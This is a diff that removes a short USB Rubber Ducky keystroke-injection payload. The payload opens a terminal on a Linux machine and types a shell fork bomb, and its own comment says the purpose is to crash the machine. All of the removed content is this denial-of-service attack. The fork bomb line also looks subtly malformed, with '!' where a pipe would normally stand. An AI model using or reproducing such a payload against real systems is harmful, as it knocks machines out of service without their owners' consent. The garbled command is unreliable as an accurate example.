@@ -1,5 +1,0 @@
-REM Forkbomb to crash Linux machines
-DEFAULT_DELAY 700
-ALT T
-STRING :(){ :!:& };:
-ENTER
